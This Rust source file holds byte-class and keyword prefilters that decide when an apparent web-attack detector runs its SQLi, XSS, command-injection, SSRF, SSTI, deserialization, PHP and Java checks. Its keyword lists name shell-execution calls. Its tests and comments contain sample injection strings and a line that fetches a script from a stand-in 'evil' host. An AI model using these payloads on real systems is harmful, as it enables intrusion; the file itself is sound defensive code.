//! Cheap prefilters. Before running a (relatively) expensive semantic detector,
//! we do one byte-class pass over the value plus, for SQLi/XSS, a shared
//! Aho-Corasick keyword scan. The overwhelming majority of benign values carry
//! none of the trigger bytes/keywords and are skipped in tens of nanoseconds.

use std::sync::OnceLock;

use aho_corasick::{AhoCorasick, AhoCorasickKind, MatchKind};

/// Byte-class flags OR-ed over a value in a single pass.
pub type Flags = u16;

pub const QUOTE: Flags = 1 << 0; // ' or "
pub const ANGLE: Flags = 1 << 1; // <
pub const SHELL: Flags = 1 << 2; // ; | & ` $
pub const PCT: Flags = 1 << 3; // %
pub const PAREN: Flags = 1 << 4; // (
pub const CTRL: Flags = 1 << 5; // any C0 control byte (NUL, CR, LF, …) except tab
pub const BSLASH: Flags = 1 << 6; // backslash
pub const DOT: Flags = 1 << 7; // .
pub const SLASH: Flags = 1 << 8; // /
pub const EQ: Flags = 1 << 9; // =
pub const CMP: Flags = 1 << 10; // < >  (comparison, for unquoted SQL tautologies)
pub const DOLLAR: Flags = 1 << 11; // $   (nosql operators, ssti `${`/.NET `$type`)
pub const LBRACE: Flags = 1 << 12; // {   (ssti `{{`/`${`/`#{`)
pub const COLON: Flags = 1 << 13; // :    (php-serialized `o:1:`, deser markers)
pub const HASH: Flags = 1 << 14; // #     (SQL line comment — was a per-value `contains('#')`)

/// Multi-byte gate-substring categories, produced by one shared Aho-Corasick
/// pass ([`substr_scan`]) instead of per-gate `contains` scans.
pub type SubFlags = u8;
pub const SUB_SQLI: SubFlags = 1 << 0;
pub const SUB_DESER: SubFlags = 1 << 1;
pub const SUB_PHP: SubFlags = 1 << 2;
pub const SUB_JAVA: SubFlags = 1 << 3;
const SUB_ALL: SubFlags = SUB_SQLI | SUB_DESER | SUB_PHP | SUB_JAVA;

const fn class_table() -> [Flags; 256] {
    let mut t = [0u16; 256];
    t[b'\'' as usize] = QUOTE;
    t[b'"' as usize] = QUOTE;
    t[b'<' as usize] = ANGLE | CMP;
    t[b'>' as usize] = CMP;
    t[b';' as usize] = SHELL;
    t[b'|' as usize] = SHELL;
    t[b'&' as usize] = SHELL;
    t[b'`' as usize] = SHELL;
    t[b'$' as usize] = SHELL | DOLLAR;
    t[b'{' as usize] = LBRACE;
    t[b':' as usize] = COLON;
    t[b'%' as usize] = PCT;
    t[b'(' as usize] = PAREN;
    t[b'#' as usize] = HASH;
    // Every C0 control byte (NUL, CR, LF and the rest, except tab) flags `CTRL` —
    // this is exactly the set `proto::detect` can fire on (null byte / CRLF header
    // injection / C0-control cluster), so the proto detector is gated on it.
    let mut c = 0usize;
    while c < 0x20 {
        if c != b'\t' as usize {
            t[c] = CTRL;
        }
        c += 1;
    }
    t[b'\\' as usize] = BSLASH;
    t[b'.' as usize] = DOT;
    t[b'/' as usize] = SLASH;
    t[b'=' as usize] = EQ;
    t
}

static CLASS: [Flags; 256] = class_table();

/// One pass over the value, OR-ing each byte's class bits.
pub fn scan(v: &str) -> Flags {
    let mut f = 0;
    for &b in v.as_bytes() {
        f |= CLASS[b as usize];
    }
    f
}

// -- SQLi / XSS keyword automatons (case-insensitive, leftmost) --------------

/// One Aho-Corasick automaton over the multi-byte gate substrings, tagged by
/// category, so a single [`substr_scan`] pass per value drives both the SQLi and
/// deserialization gates — replacing the old separate SQLi-keyword pass *and*
/// deser's per-value `contains` scans.
struct GateAc {
    ac: AhoCorasick,
    /// Category bits indexed by pattern id.
    cats: Vec<SubFlags>,
}

fn gate_ac() -> &'static GateAc {
    static AC: OnceLock<GateAc> = OnceLock::new();
    AC.get_or_init(|| {
        // (pattern, category). SQLi: distinctive tokens only — never bare
        // "or"/"and" (they match inside English words) — plus comment markers.
        // Deser: serialized-stream markers (Java base64 magic, pickle, .NET).
        let entries: &[(&str, SubFlags)] = &[
            ("union", SUB_SQLI),
            ("select", SUB_SQLI),
            ("insert", SUB_SQLI),
            ("update", SUB_SQLI),
            ("delete", SUB_SQLI),
            ("drop", SUB_SQLI),
            ("sleep", SUB_SQLI),
            ("benchmark", SUB_SQLI),
            ("waitfor", SUB_SQLI),
            ("information_schema", SUB_SQLI),
            ("load_file", SUB_SQLI),
            ("outfile", SUB_SQLI),
            ("dumpfile", SUB_SQLI),
            ("xp_cmdshell", SUB_SQLI),
            ("concat", SUB_SQLI),
            ("char(", SUB_SQLI),
            ("0x", SUB_SQLI),
            ("extractvalue", SUB_SQLI),
            ("updatexml", SUB_SQLI),
            ("pg_sleep", SUB_SQLI),
            ("having", SUB_SQLI),
            ("procedure", SUB_SQLI),
            ("--", SUB_SQLI),
            ("/*", SUB_SQLI),
            ("rO0AB", SUB_DESER),
            ("__reduce__", SUB_DESER),
            ("c__builtin__", SUB_DESER),
            ("$type", SUB_DESER),
            // Extended serialization markers (Java hex magic / stream class, more
            // pickle opcodes, Ruby YAML, Node node-serialize, .NET typed).
            ("aced0005", SUB_DESER),
            ("objectinputstream", SUB_DESER),
            ("__reduce_ex__", SUB_DESER),
            ("cposix", SUB_DESER),
            ("!ruby/object", SUB_DESER),
            ("_$$nd_func$$_", SUB_DESER),
            ("__type", SUB_DESER),
            ("typeobject", SUB_DESER),
            // PHP code/function injection (call form) + superglobals + open tag.
            ("<?php", SUB_PHP),
            ("preg_replace", SUB_PHP),
            ("system(", SUB_PHP),
            ("exec(", SUB_PHP),
            ("shell_exec(", SUB_PHP),
            ("passthru(", SUB_PHP),
            ("popen(", SUB_PHP),
            ("proc_open(", SUB_PHP),
            ("pcntl_exec(", SUB_PHP),
            ("assert(", SUB_PHP),
            ("create_function(", SUB_PHP),
            ("call_user_func(", SUB_PHP),
            ("base64_decode(", SUB_PHP),
            ("gzinflate(", SUB_PHP),
            ("str_rot13(", SUB_PHP),
            ("file_get_contents(", SUB_PHP),
            ("fsockopen(", SUB_PHP),
            ("phpinfo(", SUB_PHP),
            ("$_get", SUB_PHP),
            ("$_post", SUB_PHP),
            ("$_request", SUB_PHP),
            ("$_cookie", SUB_PHP),
            ("$_server", SUB_PHP),
            ("$_files", SUB_PHP),
            ("$_env", SUB_PHP),
            ("$_session", SUB_PHP),
            // Java / JVM expression & reflection injection markers.
            ("ognl", SUB_JAVA),
            (".classloader", SUB_JAVA),
            ("getclassloader", SUB_JAVA),
            ("nashorn", SUB_JAVA),
            ("javax.script", SUB_JAVA),
            ("scriptengine", SUB_JAVA),
            ("getruntime", SUB_JAVA),
            ("runtime.exec", SUB_JAVA),
            ("processbuilder", SUB_JAVA),
            ("getdeclaredmethod", SUB_JAVA),
            ("forname(", SUB_JAVA),
            ("java.lang.runtime", SUB_JAVA),
            ("%{", SUB_JAVA),
        ];
        let patterns: Vec<&str> = entries.iter().map(|(p, _)| *p).collect();
        let cats: Vec<SubFlags> = entries.iter().map(|(_, c)| *c).collect();
        // `Standard` (not LeftmostFirst) so `find_overlapping_iter` reports every
        // pattern — a gate must never miss a marker hidden behind an overlap.
        let ac = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::Standard)
            .kind(Some(AhoCorasickKind::DFA))
            .build(&patterns)
            .expect("static prefilter patterns are valid");
        GateAc { ac, cats }
    })
}

/// One Aho-Corasick pass → the set of gate categories the value triggers.
pub fn substr_scan(v: &str) -> SubFlags {
    let g = gate_ac();
    let mut s = 0;
    for m in g.ac.find_overlapping_iter(v) {
        s |= g.cats[m.pattern().as_usize()];
        if s == SUB_ALL {
            break; // every category seen — stop scanning
        }
    }
    s
}

fn xss_ac() -> &'static AhoCorasick {
    static AC: OnceLock<AhoCorasick> = OnceLock::new();
    AC.get_or_init(|| {
        // High-signal markers only, so the gate stays tight: dangerous schemes,
        // and event-handler shapes (`' on…`, `" on…`, ` on…`). Bare `<` is handled
        // by the ANGLE byte-class flag, not here.
        let patterns = [
            "javascript:",
            "vbscript:",
            "data:text/html",
            " on",
            "'on",
            "\"on",
            "onerror",
            "onload",
            "expression(",
        ];
        build(&patterns)
    })
}

fn build(patterns: &[&str]) -> AhoCorasick {
    AhoCorasick::builder()
        .ascii_case_insensitive(true)
        .match_kind(MatchKind::LeftmostFirst)
        .kind(Some(AhoCorasickKind::DFA))
        .build(patterns)
        .expect("static prefilter patterns are valid")
}

fn xss_kw(v: &str) -> bool {
    xss_ac().is_match(v)
}

// -- Per-module gates --------------------------------------------------------

/// Run the SQLi detector only when the value shows SQL-ish punctuation, comment
/// markers, or a distinctive keyword.
pub fn sqli_gate(flags: Flags, substr: SubFlags) -> bool {
    // `CMP` (`<`/`>`) is included so unquoted tautologies like `1 OR 1>0` — which
    // carry no quote, `=`, comment marker, or distinctive keyword — still reach
    // the structure-aware detector (which then needs a logic word + comparison +
    // operands adjacency to fire, so the wider gate adds no false positives).
    // `#` is a byte-class flag; keywords and `--`/`/*` come from the shared
    // `substr_scan` pass — so the gate is just a flag test plus a bitset test.
    flags & (QUOTE | EQ | CMP | HASH) != 0 || substr & SUB_SQLI != 0
}

/// Run the XSS detector when the value has an angle bracket (a tag) or matches a
/// high-signal marker (dangerous scheme / event-handler shape).
pub fn xss_gate(flags: Flags, v: &str) -> bool {
    flags & ANGLE != 0 || xss_kw(v)
}

/// Run path-traversal checks when the value has path separators or dots.
pub fn traversal_gate(flags: Flags) -> bool {
    flags & (DOT | SLASH | BSLASH) != 0
}

/// Run command-injection checks when a shell metacharacter is present. `CTRL`
/// covers newline (`\n`), which the detector treats as a command separator —
/// otherwise newline-separated injection (`foo\nwget http://evil/sh`) would be
/// gated out even though `cmdi::detect` handles it.
pub fn cmdi_gate(flags: Flags) -> bool {
    flags & (SHELL | CTRL) != 0
}

/// Run SSRF checks on URL-shaped values, plus bare cloud-metadata paths (which
/// `ssrf::detect` flags even without a scheme — e.g. a relative
/// `/latest/meta-data/…`). The two substrings cover every entry in the
/// detector's `META_PATHS` list; the authoritative list stays in `ssrf::detect`.
pub fn ssrf_gate(flags: Flags, v: &str) -> bool {
    // Every SSRF shape requires a `/` (a scheme `://`, a protocol-relative `//`,
    // or a metadata *path* `/latest/meta-data/…`), so the `SLASH` flag (free, from
    // `scan`) lets a `/`-free value skip the substring scans.
    flags & SLASH != 0
        && (v.contains("://")
            || v.starts_with("//")
            || v.contains("meta-data")
            || v.contains("metadata"))
}

/// Run SSTI checks when a template delimiter is present. The `LBRACE`/`ANGLE`
/// flag pre-check (free, from `scan`) lets a value with no `{`/`<` skip the
/// substring scans entirely.
pub fn ssti_gate(flags: Flags, v: &str) -> bool {
    flags & (LBRACE | ANGLE) != 0
        && (v.contains("{{")
            || v.contains("${")
            || v.contains("#{")
            || v.contains("<%")
            || v.contains("*{"))
}

/// Run NoSQL checks when a `$` is immediately followed by a letter (a possible
/// Mongo operator like `$ne`/`$where`); skips `$5`-style prices. Gated on the
/// `DOLLAR` flag so `$`-free values pay nothing.
pub fn nosql_gate(flags: Flags, v: &str) -> bool {
    if flags & DOLLAR == 0 {
        return false;
    }
    let b = v.as_bytes();
    b.iter()
        .enumerate()
        .any(|(i, &c)| c == b'$' && b.get(i + 1).is_some_and(|n| n.is_ascii_alphabetic()))
}

/// Run XXE checks when a markup declaration (`<!`) is present.
pub fn xxe_gate(flags: Flags, v: &str) -> bool {
    flags & ANGLE != 0 && v.contains("<!")
}

/// Run deserialization checks on the distinctive serialized markers. The two
/// `contains` are cheap (memchr on a rare leading byte); the `$type` and
/// `[oa]:digit` (PHP-serialized) scans are gated on the `DOLLAR`/`COLON` flags.
pub fn deser_gate(flags: Flags, substr: SubFlags, v: &str) -> bool {
    // The base64/pickle/.NET markers (`rO0AB`/`__reduce__`/`c__builtin__`/`$type`)
    // come from the shared `substr_scan` pass; only the PHP-serialized shape
    // (`[oa]:<digit>`) stays as a `COLON`-gated byte check.
    substr & SUB_DESER != 0
        || (flags & COLON != 0
            && v.as_bytes().windows(3).any(|w| {
                matches!(w[0], b'O' | b'o' | b'A' | b'a') && w[1] == b':' && w[2].is_ascii_digit()
            }))
}

/// PHP / Java injection gates — driven purely by the shared `substr_scan` pass
/// (the markers ride the one AC scan that already serves sqli/deser).
pub fn php_gate(substr: SubFlags) -> bool {
    substr & SUB_PHP != 0
}

pub fn java_gate(substr: SubFlags) -> bool {
    substr & SUB_JAVA != 0
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scan_sets_expected_bits() {
        let f = scan("a'<b;");
        assert!(f & QUOTE != 0);
        assert!(f & ANGLE != 0);
        assert!(f & SHELL != 0);
        assert!(f & EQ == 0);
    }

    #[test]
    fn sqli_gate_needs_signal() {
        assert!(!sqli_gate(scan("hello world"), substr_scan("hello world")));
        assert!(sqli_gate(scan("1' or 1=1"), substr_scan("1' or 1=1")));
        assert!(sqli_gate(
            scan("1 union select 1"),
            substr_scan("1 union select 1")
        ));
    }

    #[test]
    fn xss_gate_needs_angle_or_quote_kw() {
        assert!(!xss_gate(scan("plain text"), "plain text"));
        assert!(xss_gate(scan("<b>"), "<b>"));
        assert!(xss_gate(scan("\" onerror=x"), "\" onerror=x"));
    }

    #[test]
    fn ssrf_gate_url_shaped() {
        assert!(ssrf_gate(scan("http://example.com"), "http://example.com"));
        assert!(!ssrf_gate(scan("just-a-value"), "just-a-value"));
        // Relative cloud-metadata paths (no scheme) must still open the gate.
        assert!(ssrf_gate(
            scan("/latest/meta-data/iam/"),
            "/latest/meta-data/iam/"
        ));
        assert!(ssrf_gate(
            scan("/computeMetadata/v1/"),
            "/computemetadata/v1/"
        ));
    }

    #[test]
    fn sqli_gate_opens_on_unquoted_comparison() {
        // `1 OR 1>0` has no quote, `=`, comment, or keyword — only `>`.
        let v = "1 or 1>0";
        assert!(sqli_gate(scan(v), substr_scan(v)));
    }

    #[test]
    fn cmdi_gate_opens_on_newline() {
        // Newline is a command separator the detector handles; the gate must open.
        let v = "foo\nwget http://evil/sh";
        assert!(cmdi_gate(scan(v)));
    }
}
